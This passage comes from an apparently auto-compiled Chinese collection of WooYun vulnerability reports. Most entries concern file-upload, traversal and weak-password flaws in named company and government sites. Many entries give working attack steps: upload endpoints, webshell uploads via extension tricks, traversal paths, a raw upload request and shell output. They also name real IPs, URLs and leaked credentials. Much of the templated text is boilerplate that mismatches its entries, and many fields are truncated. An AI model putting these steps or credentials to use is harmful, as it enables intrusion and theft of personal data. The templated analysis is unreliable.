**POC**: ID IIS_USER IIS_PASS Domain Path1 IUSR_SVCTAG-1F77L1X 3`tO|UG{G3MKz% :80: D:\wwwroot\创泉直销2 IUSR_SVCTAG-1F77L1X 3`tO|UG{G3MKz% :80:www.jxlndx.com D:\wwwroot\嘉兴老年大学3 IUSR_SVCTAG-1F77L1X 3`tO|UG{G3MKz% :80:www.katsushiro.com.cn D:\wwwroot\胜代机械4 IUSR_SVCTAG-1F77L1X 3`tO|UG{G3MKz% :80:www.jxwhpx.com D:\w

**绕过**: 直接利用

**修复**: 最简单修复方式关闭注册
---

---
### [wooyun-2011-02432] 53快服官网上传漏洞
**厂商**: 53客服网站 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加入验证
---

---
### [wooyun-2013-021796] 中国移动400 某管理后台沦陷
**厂商**: 中国移动 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"><html><head><title>Untitled</title></head><body><form id="frmUpload" enctype="multipart/form-data"action="http://221.180.20.72/fckeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php/upload.php?Type=Media" method="post">Upload a new file:<br><input type="file" name="NewFile" size="50"><br><input id="btnUplo

**POC**: [*] 基本信息 [ 	Linux xlp102 2.6.18-238.9.1.el5.028stab089.1 #1 SMP Thu Apr 14 14:06:01 MSD 2011 x86_64(www-data) ][/]$ iduid=502(www-data) gid=502(www-data) groups=502(www-data)[/]$

**绕过**: 直接利用

**修复**: 升级fck版本更换其他相对安全的编辑器自己看着办.
---

---
### [wooyun-2011-02632] 桃源网络硬盘&IIS6.0解析漏洞
**厂商**: 桃源网络硬盘 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: IIS6.0文件名解析漏洞，只要在使用IIS6.0的桃源网络硬盘上传一个php木马:123;asp;123.jpg，然后通过show.aspx?type=1&filepath=http://123/的方法取文件路径，最后执行，即可。

**POC**: http://xzdmlxx.com/hack.txthttp://disk.fhchzx.com:81/hack.txt

**绕过**: 直接利用

**修复**: http://xzdmlxx.com/hack.txthttp://disk.fhchzx.com:81/hack.txt
---

---
### [wooyun-2015-0111731] 大量大华城市安防监控系统平台管理端默认弱口令（影响重大）
**厂商**: 浙江大华技术股份有限公司 | **年份**: 2015 | **类型**: 基础设施弱口令

**元思考**: 触发信号: 上传功能

**洞察**: 基础设施弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别基础设施弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: mask 区域1.http://**.**.**/admin/login_login.action_2.http://**.**.**/admin/login_login.action_3.http://**.**.**/admin/login_login.action_4.http://**.**.**/admin/login_login.action_5.http://**.**.**/admin/login_login.action_6.http://**.**.**/admin/login_login.action_7.http://**.**.**/admin/login_login.action_8.http://**.**.**/admin/login_login.action_9.http://**.**.**/admin/login_login.action_10.htt

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修改密码吧 安防安全还是很重要的
---

---
### [wooyun-2013-028640] 联想某分站任意文件上传可控制服务器
**厂商**: 联想 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.url:http://lefen.lenovo.com/index.php/kebi/2.上传图片处，只验证了图片类型，未验证图片格式。（上传插入一句话内容的jpg文件，然后burp抓包，修改上传文件后缀为php。）图片修改：Burp上传抓包修改php就不说了。

**POC**: 1.权限、版本2.数据库3.用户信息泄漏4.另外，站点还有目录浏览

**绕过**: 直接利用

**修复**: 1.上传 过滤2.上传目录不允许脚本执行，或者上传至远程服务器3.数据库弱口令 123456 lenovo 修改4.顺便恭喜7月11日 联想登顶全球PC第一,可否来个礼物？5.昨天发的漏洞也一并审了吧
---

---
### [wooyun-2013-035539] 成都杰迈科技后台越权访问任意上传
**厂商**: 成都杰迈科技 | **年份**: 2013 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后台页面可直接访问无需登录 http://www.jiemai-tech.com/admin/infoManage.do任意后缀上传。

**POC**: 后台页面可直接访问无需登录 http://www.jiemai-tech.com/admin/infoManage.do任意后缀上传。

**绕过**: 直接利用

**修复**: 你们懂得
---

---
### [wooyun-2013-023816] 江苏卫视某站任意文件上传，导致大量用户详细资料泄露+70多万明文密码无节操!
**厂商**: 江苏卫视 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞位于乌云兄的WooYun: 江苏卫视大量演员名单泄露，手机，QQ，照片,，地址一应俱全，涉及的子站中。http://hd.jsbc.com/bxlz/index.aspx虽然上传后返回不了上传地址，但是配合wooyun-2013-022201，可以查看到上传地址。另外，为了防止二次进入，已对漏洞页面进行改名处理（index_tested_by_3king.aspx)

**POC**: 1.填好其它信息后，直接选择asp、php程序进行上传。2.从http://hd.jsbc.com/bxlz/admin/search.aspx搜索前面填写的姓名。3.查看上传的图片地址。4.虽然提示目录有执行权限限制，但输入任意.aspx路径后返回.net报错。显然由于配置失误，可以执行.net程序！！5.上传aspx文件，得shell，进服务器。6.发现同服务器内大量子站点。7.服务器内FlashFXP中储存有一些内网FTP密码。8.数据库密码（sa权限）9.大量数据库10.大量用户信息（详细信息+明文密码，70W）

**绕过**: 直接利用

**修复**: ·删除本例中涉及的所有木马，并进行全盘木马检查。·修复漏洞页面，并修复其它子站存在大大小小问题的页面（自己去查吧，我不说了）。·修改本例中涉及的FTP密码。·用户密码加密处理。·就不求礼物了，求节操。。。
---

---
### [wooyun-2011-02702] 新浪某点上传不过滤
**厂商**: 新浪 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 什么都可以上传，可以欺骗挂马哦http://t.auto.sina.com.cn/sheyingdasai/iframe/upload.php?sid=26

**POC**: http://t.auto.sina.com.cn/sheyingdasai/iframe/upload.php?sid=26

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-07224] 山东省农业机械管理局下属sdnj.gov.cn山东农机化网站Jboss漏洞
**厂商**: JBOSS | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 给jmx-console加上访问密码1.在 ${jboss.server.home.dir}/deploy下面找到jmx-console.war目录编辑WEB-INF/web.xml文件 去掉 security-constraint 块的注释，使其起作用2.编辑WEB-INF/classes/jmx
---

---
### [wooyun-2014-053731] 某教育索引系统漏洞殃及100多中小学站点
**厂商**: 某教育系统 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: xxwz.cxedu.gov.cn  教育索引系统使用有漏洞的siteserver 可被渗透，上面有100多中小学站点测试过程:直接上图 访问漏洞页面获得返回信息修改返回信息 将302 修改成200访问上传页面选择zip压缩包进行上传上传请求包 如下:获得上传后页面:使用菜刀连接发现首页的所有站点 都在这个服务器上有100多个哦数据库使用sa连接没有进一步测试

**POC**: http://xxwz.cxedu.gov.cn//sitefiles/siteTempLates/test/test.asp

**绕过**: 直接利用

**修复**: 不使用siteserver
---

---
### [wooyun-2014-061978] drops文章《上传文件的陷阱》实例应用
**厂商**: 乌云官方 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://drops.wooyun.org/tips/2031说的问题很清楚我也不重复了，乌云的几个上传好像都没做文件内容的检查 包括发布漏洞编辑器zone编辑器drops编辑器第一次测试的结果很不顺利主站发布处上传的图片有referer检查zone的上传到wzone.sinaapp.com了drops的传完了打开居然是0字节原本已经想放弃了，盯着fiddler里的http头看了半天索性死马当活马医试试referer的校验机制，结果第一次尝试修改referer为http://www.baidu.com/www.wooyun.org/就成功了看来哪里都有加班写错代码的程序猿啊referer解决了 其他就好办了 新建一个flash项目，先get一下http://www.wooyun.org/teams/（选这个没别的理由，就因为页面内容少。。速度快一点 token几乎每个页面都有）获取/u

**POC**: 访问http://qaz.me/www.wooyun.org/csrf.html查看控制面板

**绕过**: 过滤绕过

**修复**: referer上传
---

---
### [wooyun-2013-021631] ThinkSNS开发的微博程序存在过滤不严
**厂商**: ThinkSNS | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在上传文件过滤不严，可直接上传危险后纂名文件！

**POC**: 上传WEBSHELL以后，

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-075205] 某商城cms系统文件删除漏洞一枚
**厂商**: 动软商城 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞有疑问，该图片由于审核慢了，应该被管理员还原了，重新组织了下疑问，可以复现的。动软商城系统 官网：http://www.maticsoft.com/shop.aspx demo：http://shop1.maticsoft.cn/ 先相中一枚想删除的图片： http://shop1.maticsoft.cn/Upload/AD/34/201306251621094269405.jpg使用测试账号（普通注册用户即可） 注册用户登录后创建一个小组，http://shop1.maticsoft.cn/SNS/Group/Create，创建是选择一个正常文件上传后保存。然后再修改创建的小组，审查元素，找到以下内容：value为目标删除文件路径地址点击保存，此时目标图片已经被删除

**POC**: 如上

**绕过**: 直接利用

**修复**: 限制权限
---

---
### [wooyun-2015-0158259] 开源证券主站存在任意文件上传\目录遍历\文件删除漏洞
**厂商**: 开源证券股份有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 参数注入

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 主站问题文件http://www.kysec.cn/qk/tools/Main.aspx通过该文件管理，你可以遍历http://www.kysec.cn/qk/tools/main.aspx?path=/../自己控制path参数，页面上操作经常把路径弄错

**POC**: 上传http://www.kysec.cn/qk/tools/Main.aspxPOST http://www.kysec.cn/qk/tools/Main.aspx?act=upload&path=/../../ HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://www.kysec.cn/qk/tools/main.aspxAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; 

**绕过**: 直接利用

**修复**: 权限控制，shell我已经自杀了，求20rank
---

---
### [wooyun-2015-0107921] 南京航空航天大学存在漏洞
**厂商**: 南京航空航天大学 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://mba.nuaa.edu.cn/wwwroot.rar源代码下载地址导致数据库一起被下载了

**POC**: http://mba.nuaa.edu.cn/wwwroot.rar源代码下载地址导致数据库一起被下载了

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-026996] 通达OA系统过滤机制不够严谨导致服务器沦陷！
**厂商**: tongda2000.com | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通达OA系统过滤机制不够严谨，导致服务器沦陷！服务器沦陷

**POC**: 通达OA系统官方演示系统URL =  http://t9.go2oa.com利用试用账户登录进去在控制面板-> 昵称与头像 -> 上传  可上传任意文件。上传SELL --> url = http://t9.go2oa.com/t9/attachment/avatar/1122.jspshell  没有删除。你们去删除吧。在shell里可执行cmd命令！netstat -an   远程桌面端口 3399服务器为毛装 数字安全？？没做任何破坏，拒绝查水表！能不能送一套OA系统 ，能行话，感谢万分。求OA系统一套！！！！

**绕过**: 直接利用

**修复**: 你们更专业，相信你们！
---

---
### [wooyun-2014-059161] 某政务类CMS弱口令+多处任意文件上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 默认配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 默认配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别默认配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 随便输入了一个关键词啊.inurl:Infos/MoreInfos.aspx主要针对政府网站。随便找了俩处啊。http://www.xmhlkj.gov.cn/file/index.asphttp://www.astc.gov.cn/file/index.asp默认管理员admin/adminhttp://www.xmhlkj.gov.cn/ManageModule/Info/fckeditor/editor/filemanager/connectors/uploadtest.htmlhttp://www.astc.gov.cn/ManageModule/Info/fckeditor/editor/filemanager/connectors/uploadtest.htmlhttp://www.jimeikj.gov.cn/ManageModule/Info/fckeditor/edito

**POC**: 任意文件上传,没有任何现在可以直接提权服务器啊。直接远程终端就可以进入服务器.危害挺严重的啦。配合IIS6.0解析漏洞，合理运用。权限撒滴还是蛮大啦。ftb.imagegallery.aspx可上传图片，但未对图片进行重命名，可利用IIS解析漏洞1.asp;.gif方式上传脚本木马。测试了下，未深入。

**绕过**: 直接利用

**修复**: 拒绝弱口令.
---

---
### [wooyun-2015-0149801] 中国数字大学城存在文件上传漏洞导致数十万条学生和教师信息泄露
**厂商**: 中国数字大学城 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 系统网址为http://**.**.**.**/sc8/登录界面使用某学生弱口令账号登录，发现在设置-》个人介绍功能处使用富文本编辑，可以上传图片，通过burp修改后缀名可以上传jsp木马。

**POC**: 上传jsp大马，连接成功截图如下：代码配置文件所在路径：从配置文件中找到数据库用户名密码ps：数据库开放3306端口，远程连接仅能访问部分数据库，不能访问关键数据库，所以使用大马本地连接数据库，以下是其中student数据库的部分信息截图，粗略看一下，这个表有70W条数据，还有teacher表，以及课程、成绩等表等等

**绕过**: 直接利用

**修复**: 没什么可说的，对上传文件类型进行检查，其实系统大部分文件上传的功能处都做了处理，只不过富文本提交的地方没处理关闭3306端口系统还存在一些越权问题，这小问题就先不说了
---

---
### [wooyun-2015-0113645] 软航NTKO大文件上传控件可导致IE任意代码执行
**厂商**: 软航 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 软航NTKO大文件上传IE控件的AddLocalFile函数存在安全漏洞，可导致EIP被控制，从而执行任意代码控制IE浏览器用户的系统

**POC**: 下面的这个演示视频揭示了该漏洞在安装了该控件的IE用户浏览含有可以代码的网页时直接触发，无需交互操作，EIP被指向00430043（unicode "CC"字符串），测试环境是win7+IE11http://1drv.ms/1bJpo6O

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-092752] 神华集团某站点Fck任意文件上传
**厂商**: 神华集团 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1# fck上传http://sdgs.shenhuagroup.com.cn/manage/fckeditor/editor/filemanager/connectors/test.html#二次上传2# 物理路径信息泄露

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 权限设置
---

---
### [wooyun-2015-090987] CETTIC某后台设计不当导致大量用户信息泄露
**厂商**: 人力资源和社会保障部 | **年份**: 2015 | **类型**: 用户资料大量泄漏

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 用户资料大量泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别用户资料大量泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在90IP中的一个后台test  test ？直接可任意文件上传，未作任何过滤。经过分析，找到了路径。在配置文件中找到了sql sever的账号；数据泄露了，可谓是畅通无阻。用工具查查吧。培训人员身份证：信息没有任何的安全措施

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 为了安全，密码已经为您改成了test88888888从里面看发现没有别的后门，应该没有别人进去。shell已经删除了，做好安全工作。
---

---
### [wooyun-2014-079079] 福建省营运车辆卫星定位安全服务系统上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 福建省营运车辆卫星定位安全服务系统上传漏洞

**POC**: 福建省营运车辆卫星定位安全服务系统http://www.fjjt.gov.cn/ztzl/gps/属于福建交通厅的分站，该网站上提供了对营运车辆卫星定位服务查询http://218.85.65.5:8080/login2.jsp尝试使用弱口令失败对IP 218.85.65.5 服务器进行扫描。发现该服务器开放了另外一个端口http://218.85.65.5:8080/http://218.85.65.5:8086/ 其中这个端口可以遍历文件http://218.85.65.5:8086/iflow/verify/public_result.jsp?currentpage=6318发现该管理系

**绕过**: 直接利用

**修复**: 你们懂得~求礼物
---

---
### [wooyun-2013-031709] 亚风快递被入侵可能导致客户信息泄露等
**厂商**: 亚风速递 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 详细没什么讲无意中百度发现的，看图说明http.oa.broad-asia.net/thank.asp密码：showcctv应该成了别人傀儡机很久了。

**POC**: http.oa.broad-asia.net/thank.asp密码：showcctv应该成了别人傀儡机很久了。

**绕过**: 直接利用

**修复**: 估计的要从新写过啦。
---

---
### [wooyun-2014-050972] ATA 考试服务专家官网任意文件上传
**厂商**: ATA集团 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ATA，全国很多大型的考试都是这家公司做的。完全是无意随便扫到这站的，很普通的上传漏洞。通过通过网站的robots文件来发现后台路径然后扫出来的一个上传页面：然后发现对上传的文件没有过滤，并且是IIS/6.0 试试那个图马~怎么得到这个图马的地址呢？在首页随便找到个图片看属性得到目录然后成功，连接上了一句话

**POC**: 漏洞证明：

**绕过**: 直接利用

**修复**: 修复？过滤 小心路径暴露啊~~
---

---
### [wooyun-2014-057197] 用友某办公自动化平台漏洞之1-未授权访问导致目录漏洞
**厂商**: 用友软件 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 无意间看到这个平台FE协作办公平台测试版本：5.2.1版本大于5.2.1未受影响，小于5.2.1的版本未测在网上用百度找了一下直接访问/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../可以通过../跳转目录，导致敏感信息泄露

**POC**: 无意间看到这个平台FE协作办公平台测试版本：5.2.1版本大于5.2.1未受影响，小于5.2.1的版本未测在网上用百度找了一下直接访问/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../可以通过../跳转目录，导致敏感信息泄露

**绕过**: 直接利用

**修复**: 过滤字符“.”
---

---
### [wooyun-2012-013907] 100E任意文件上传
**厂商**: 100e.com | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://elearning.100e.com/EngNews/NewsUpLoad.asp这里可以上传任意文件，但是好像要覆盖到首页的新闻，上传以后去数据库删除掉就可以了

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 别让所有人都能发新闻……
---

---
### [wooyun-2015-095284] 正方某个系统存在上传漏洞（通用 多案例）
**厂商**: 正方软件 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 百度搜索 正方软件股份有限公司 版权所有  联系电话：0571-89902828百度为您找到相关结果约1,450个全部存在FCK编辑器漏洞

**POC**: 1----http://218.75.197.120:88/fckeditor//editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp2----http://jsyd.suda.edu.cn/fckeditor//editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp3----http://xk.suda.edu.c

**绕过**: 直接利用

**修复**: sj
---

---
### [wooyun-2014-078999] 延安建设网存在上传漏洞（二）
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 功能测试

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 第二个了

**POC**: http://www.yajsgh.gov.cn/admin/netQA/WSDCQCAdd.aspx

**绕过**: 直接利用

**修复**: 增加安全级别。
---

---
### [wooyun-2011-01453] 新浪上传过滤不严
**厂商**: 新浪 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 新浪网分级目录过滤不严，拥有上传权限。

**POC**: http://pic.data.games.sina.com.cn/upload.php

**绕过**: 直接利用

**修复**: 很简单的修复手法。
---

---
### [wooyun-2012-012928] 新理念外语网络教学平台文件上传
**厂商**: 上海外语教育出版社 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 信息泄露和权限不严导致列目录及上传以南开大学的为例:http://222.30.60.3/NPELSNPELS_LearningCenter_5.0 客户端下的 Update.exe.config 文件泄露一个重要地址<setting name="Update_CommonSvr_CommonService" serializeAs="String"><value>http://222.30.60.3/NPELS/CommonService.asmx</value></setting>及版本号<add key="TVersion" value="1, 0, 0, 2187"></add>直接访问http://222.30.60.3/NPELS/CommonService.asmx使用GetTestClientFileList操作，直接 HTTP GET 列目录：http://222.30.

**POC**: 列目录：http://222.30.60.3/NPELS/CommonService.asmx/GetTestClientFileList?version=../../文件上传：http://222.30.60.3/npelsv/editor/editor.htm上传木马：http://222.30.60.3/npelsv/editor/uploadfiles/1.aspx

**绕过**: 直接利用

**修复**: 好像考试系统必须使用 CommonService.asmx最好配置文件加密或者用别的方式不让它泄露出来并且检查或删除各上传入口，像 http://222.30.60.3/NPELS/Upload.aspx 一样
---

---
### [wooyun-2012-06519] 福建省国土资源厅任意jsp上传
**厂商**: 福建省国土资源厅 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 福建省国土资源厅存在任意文件直接上传bug上传页面:http://mail.fjgtzy.gov.cn/admin/template/uploadFile.jsp对应后台处理代码public ActionForward execute(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response){UploadFileForm uploadFileForm = (UploadFileForm)form;String realPath = request.getParameter("realPath");String dir = this.servlet.getServletContext().getRealPath(realPath);FormFile fil

**POC**: http://mail.fjgtzy.gov.cn/admin/conndb.jspshell是系统权限。简单看了一下，该站点数据库与主机分离，数据库是sa权限，可能直接获得另一台主机（没有测试).数据库连接文件Proxool.properties站点有邮件服务器，http://www.fjgtzy.gov.cn:6080/admin/index.phpwinmail密码admin/evecomtest/testtest123/test123后台简单看一个眼，网上审批？很...该服务器上好像还有很多东西，很多代码，很多数据...不看了，睡觉了，明天早起...

**绕过**: 直接利用

**修复**: 该套代码很庞大，难免出现漏洞，可以说这套代码在我看到的几个政府代码中算是好的，代码本身有过滤功能，让我弄了半天，本想直接使用FCK上传一个jsp，总是被拦截，看了一下拦截代码，过滤evecom.jspcode='|and|set|exec|varchar|insert|select|*|update
---

---
### [wooyun-2015-0109609] 东软某系统文件上传导致任意代码执行漏洞(影响众多政务、住房公积金、社保系统数据安全)
**厂商**: 东软集团 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 系统名称：东软通用门户软件 UniPortal 1.2漏洞说明：该系统中某页面存在未授权访问，可上传任意文件（包含jsp脚本），秒杀该系统，影响重大，望 CnCert国家互联网应急中心 敦促修复该漏洞。搜索：inurl:ecdomain在百度收集了部分案例如下(远比下面给出的40个案例多的多)：mask 区域1.http://**.**.**/_2.http://**.**.**/_3.http://**.**.**/_4.http://**.**.**/_5.http://**.**.**/_6.http://**.**.**/_7.http://**.**.**/_8.http://**.**.**/_9.http://**.**.**/_10.http://**.**.**/_11.http://**.**.**/_12.http://**.**.**/_13.http://**.*

**POC**: 漏洞利用：1）问题链接可从 [测试代码] 区域查看。2）上传时，抓包wooyun.jpg 修改为 wooyun.jsp。3）成功后访问 http://website/ecdomain/portal/webpages/web/网站名称/images/文件名称.jsp4）“网站名称”的获取方法为：打开问题链接给出几个上传的成功的案例：1）http://www.mzsi.gov.cn/http://www.mzsi.gov.cn/ecdomain/portal/webpages/web/mzsi/images/wooyun.jsp2）http://www.gslz.lss.gov.cn/http:/

**绕过**: 直接利用

**修复**: 0x01:修复未授权访问0x02:限制上传文件的格式（尽量在服务端做验证，并非本地验证）
---

---
### [wooyun-2015-0107735] 中国电信号码百事通分站配置不当致文件上传漏洞
**厂商**: 189.cn | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://lbs.189.cn/kindeditor/php/file_manager_json.php?path=/泄露绝对路径等信息http://lbs.189.cn/kindeditor/php/demo.phphttp://lbs.189.cn/kindeditor/php/upload_json.php?dir=file 可以post上传文件查看kindeditor的upload_json.ashx源代码，允许上传的文件:本地上传表单:<form action='http://lbs.189.cn/kindeditor/php/upload_json.php?dir=file' enctype="multipart/form-data" method="post"><input type="file" name="imgFile"><input type="submit"><

**POC**: http://lbs.189.cn/kindeditor/php/file_manager_json.php?path=/泄露绝对路径等信息http://lbs.189.cn/kindeditor/php/demo.phphttp://lbs.189.cn/kindeditor/php/upload_json.php?dir=file 可以post上传文件上传成功：结果：

